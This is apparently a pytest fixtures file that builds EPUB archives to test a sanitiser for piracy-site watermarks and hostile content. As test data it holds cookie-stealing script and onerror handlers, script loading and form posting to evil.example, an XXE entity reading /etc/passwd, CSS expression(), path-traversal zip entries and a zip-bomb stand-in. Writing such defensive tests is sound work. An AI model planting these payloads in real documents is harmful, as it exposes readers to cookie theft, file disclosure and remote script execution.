"""EPUB fixtures for the test suite.

The books are assembled byte by byte so every rule can be exercised in
isolation: one clean reference book, one with Ocean-of-PDF style insertions, one
built only from citations, one that needs confirmation, and several hostile
archives.
"""

from __future__ import annotations

import io
import sys
import zipfile
from pathlib import Path

import pytest

SRC = Path(__file__).resolve().parents[1] / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

MIMETYPE = b"application/epub+zip"

CONTAINER = """<?xml version="1.0" encoding="utf-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>"""

NAV = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>Contents</title></head>
<body>
  <nav epub:type="toc" id="toc">
    <h1>Contents</h1>
    <ol>
      <li><a href="chapter1.xhtml">Chapter One</a></li>
      <li><a href="chapter2.xhtml">Chapter Two</a></li>
    </ol>
  </nav>
</body>
</html>"""

STYLES = """@charset "utf-8";

p.download::after {
  content: "OceanofPDF";
  color: #444;
}

div.bad {
  width: expression(alert(1));
}

body {
  font-family: Georgia, serif;
  margin: 1em;
}
"""


def opf_package(
    *,
    manifest: str,
    spine: str,
    metadata: str = "",
    version: str = "3.0",
    guide: str = "",
) -> str:
    return f"""<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="{version}" unique-identifier="bookid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="bookid">urn:uuid:12345678-1234-1234-1234-123456789012</dc:identifier>
    <dc:title>Analog Church</dc:title>
    <dc:creator>Jay Y. Kim</dc:creator>
    <dc:language>en</dc:language>
    <meta property="dcterms:modified">2020-01-01T00:00:00Z</meta>
    {metadata}
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    {manifest}
  </manifest>
  <spine>
    {spine}
  </spine>
  {guide}
</package>"""


CHAPTER_ONE = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head><title>Chapter One</title><link rel="stylesheet" type="text/css" href="styles.css"/></head>
<body>
  <h1>Chapter One</h1>
  <p>The church has always been analog: real people, real places, real things.</p>
  <p>Screens are not evil, but they are not neutral either.</p>
  <div class="footer-note">
    <p>Downloaded from OceanofPDF.com - free ebooks every day.</p>
    <a href="https://www.oceanofpdf.com">OceanofPDF</a>
  </div>
  <img src="images/pixel.png" width="1" height="1" alt=""/>
  <script>alert(document.cookie)</script>
  <img src="images/figure.png" onerror="steal(document.cookie)" alt="A figure"/>
  <iframe src="https://ads.example.com/frame"></iframe>
</body>
</html>"""

CHAPTER_TWO = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Chapter Two</title><link rel="stylesheet" type="text/css" href="styles.css"/></head>
<body>
  <h1>Chapter Two</h1>
  <p>Worship is embodied, and embodiment takes time.</p>
  <p>Silence is a kind of architecture.</p>
</body>
</html>"""

PROMO_PAGE = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Free books</title></head>
<body>
  <p>Download more free books at OceanofPDF.com</p>
  <p><a href="https://www.oceanofpdf.com">OceanofPDF</a></p>
</body>
</html>"""

CITATION_CHAPTER = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Notes</title></head>
<body>
  <h1>Notes</h1>
  <blockquote><p>As the editors at OceanofPDF observe, digitisation changes how a page is read.</p></blockquote>
  <p>This chapter continues with ordinary prose about typography and attention.</p>
</body>
</html>"""

REVIEW_CHAPTER = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Chapter Three</title></head>
<body>
  <h1>Chapter Three</h1>
  <p>This copy was downloaded from OceanofPDF and is shared for review.</p>
  <p>The rest of the chapter discusses liturgy, community and the shape of a Sunday morning.</p>
</body>
</html>"""

XXE_CHAPTER = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Internal</title></head>
<body><p>Hello &xxe; world.</p></body>
</html>"""

MALICIOUS_CHAPTER = """<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Chapter One</title></head>
<body onload="boot()">
  <h1>Chapter One</h1>
  <p>Ordinary paragraph that should survive.</p>
  <script src="https://evil.example/x.js"></script>
  <a href="javascript:alert(1)">read more</a>
  <iframe src="https://evil.example/frame"></iframe>
  <object data="payload.bin"></object>
  <meta http-equiv="refresh" content="0;url=https://evil.example/"/>
  <img src="https://www.google-analytics.com/collect?id=1" width="1" height="1" alt=""/>
  <img src="https://cdn.example.org/pixel.gif?utm_source=book" width="1" height="1" alt=""/>
  <form action="https://evil.example/post"><input name="email"/></form>
</body>
</html>"""


def png_bytes(size: tuple[int, int] = (1, 1)) -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    Image.new("RGB", size, (210, 210, 210)).save(buffer, format="PNG")
    return buffer.getvalue()


def build_epub(
    entries: list[tuple[str, bytes | str]],
    *,
    mimetype: bool = True,
    mimetype_stored: bool = True,
) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        if mimetype:
            info = zipfile.ZipInfo("mimetype")
            info.compress_type = zipfile.ZIP_STORED if mimetype_stored else zipfile.ZIP_DEFLATED
            archive.writestr(info, MIMETYPE)
        for name, data in entries:
            if isinstance(data, str):
                data = data.encode("utf-8")
            archive.writestr(name, data)
    return buffer.getvalue()


def sample_book() -> bytes:
    manifest = "\n    ".join(
        [
            '<item id="ch1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>',
            '<item id="ch2" href="chapter2.xhtml" media-type="application/xhtml+xml"/>',
            '<item id="promo" href="promo.xhtml" media-type="application/xhtml+xml"/>',
            '<item id="css" href="styles.css" media-type="text/css"/>',
            '<item id="pixel" href="images/pixel.png" media-type="image/png"/>',
            '<item id="figure" href="images/figure.png" media-type="image/png"/>',
        ]
    )
    spine = "\n    ".join(
        [
            '<itemref idref="ch1"/>',
            '<itemref idref="ch2"/>',
            '<itemref idref="promo"/>',
        ]
    )
    metadata = (
        "<dc:publisher>InterVarsity Press</dc:publisher>\n    "
        "<dc:description>Downloaded from OceanofPDF.com - free ebooks.</dc:description>"
    )
    return build_epub(
        [
            ("META-INF/container.xml", CONTAINER),
            ("OEBPS/content.opf", opf_package(manifest=manifest, spine=spine, metadata=metadata)),
            ("OEBPS/nav.xhtml", NAV),
            ("OEBPS/chapter1.xhtml", CHAPTER_ONE),
            ("OEBPS/chapter2.xhtml", CHAPTER_TWO),
            ("OEBPS/promo.xhtml", PROMO_PAGE),
            ("OEBPS/styles.css", STYLES),
            ("OEBPS/images/pixel.png", png_bytes((1, 1))),
            ("OEBPS/images/figure.png", png_bytes((40, 40))),
        ]
    )


def simple_book(chapter: str, *, extra_entries: list[tuple[str, bytes | str]] | None = None) -> bytes:
    manifest = '<item id="ch1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>'
    spine = '<itemref idref="ch1"/>'
    entries: list[tuple[str, bytes | str]] = [
        ("META-INF/container.xml", CONTAINER),
        ("OEBPS/content.opf", opf_package(manifest=manifest, spine=spine)),
        ("OEBPS/nav.xhtml", NAV),
        ("OEBPS/chapter1.xhtml", chapter),
    ]
    if extra_entries:
        entries.extend(extra_entries)
    return build_epub(entries)


# -- fixtures ------------------------------------------------------------
@pytest.fixture
def sample_epub() -> bytes:
    return sample_book()


@pytest.fixture
def citation_epub() -> bytes:
    return simple_book(CITATION_CHAPTER)


@pytest.fixture
def review_epub() -> bytes:
    return simple_book(REVIEW_CHAPTER)


@pytest.fixture
def malicious_epub() -> bytes:
    return simple_book(
        MALICIOUS_CHAPTER,
        extra_entries=[("OEBPS/tool.exe", b"MZ\x90\x00fake-binary")],
    )


@pytest.fixture
def xxe_epub() -> bytes:
    return simple_book(XXE_CHAPTER)


@pytest.fixture
def drm_epub() -> bytes:
    encryption = """<?xml version="1.0" encoding="utf-8"?>
<encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container"
            xmlns:enc="http://www.w3.org/2001/04/xmlenc#">
  <enc:EncryptedData>
    <enc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes256-cbc"/>
    <enc:CipherData><enc:CipherReference URI="OEBPS/chapter1.xhtml"/></enc:CipherData>
  </enc:EncryptedData>
</encryption>"""
    return simple_book(CHAPTER_TWO, extra_entries=[("META-INF/encryption.xml", encryption)])


@pytest.fixture
def traversal_epub() -> bytes:
    return simple_book(
        CHAPTER_TWO,
        extra_entries=[
            ("../evil.xhtml", "<html><body>escaped</body></html>"),
            ("OEBPS/../../escape.txt", "escaped"),
        ],
    )


@pytest.fixture
def zip_bomb_epub() -> bytes:
    return simple_book(
        CHAPTER_TWO,
        extra_entries=[("OEBPS/bomb.bin", b"\x00" * (4 * 1024 * 1024))],
    )
